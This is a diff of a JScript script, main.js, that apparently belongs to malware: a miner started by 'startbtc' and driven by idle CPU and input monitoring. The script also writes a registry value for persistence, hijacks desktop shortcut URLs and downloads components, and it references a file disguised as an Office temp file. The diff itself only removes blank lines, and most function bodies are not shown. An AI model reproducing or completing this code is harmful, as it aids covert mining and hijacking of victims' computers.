@@ -1,7 +1,5 @@
-//
 log("*----main.js----")
 log("-----main.js DateLastModified : " + __fso.GetFile(__workdir+"~$Doc1.dot").DateLastModified +", md5 : " + __storage.GetFileMD5 (__workdir+"~$Doc1.dot") + "----*")
-//
 function filter_idle(){
 }
 function filter_idle.prototype.run(pipe){
@@ -17,7 +15,6 @@ function filter_idle.prototype.run(pipe){
 	}
 	return true ;
 }
-
 function filter_sebtc(){
 }
 function filter_sebtc.prototype.setEnvironmentVariable(env){
@@ -194,8 +191,7 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 }
 function filter_sebtc.prototype.run(pipe){	
 	return this.monitorCPUandInput(pipe);			 
-} 
-
+}
 function filter_shellexcuteex(){
 }
 function filter_shellexcuteex.prototype.run(pipe){
@@ -276,7 +272,6 @@ function filter_installcomplete.prototype.run(pipe){
 	__TRY(function (){WshShell.RegWrite("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\forcelaunch", 1, "REG_DWORD")})
 	return true;
 }
-
 //1--
 function downloadforinstall(){
 	var WshShell = __wshShell
@@ -347,7 +342,6 @@ function modifyDesktopIcon(){
 	log("path = " + path + ", icon url = "+url);
 	__storage.WritePrivateProfileValue(path,"InternetShortcut","URL",url)
 }
-
 function readyExit(){
 	log("readyExit")
 	module.setDoneCallback(function(){
@@ -355,7 +349,6 @@ function readyExit(){
 		exit(100);
 	})
 }
-
 sendDesktopIconState();
 shellIconOverlayIdentifier();
 startbtc();
@@ -365,8 +358,6 @@ if(module.getRunningModules.length>0){
 }else {
 	exit(101);
 }
-
-
 /*
 var PAGE_READWRITE = 4;
 var PAGE_READONLY =2
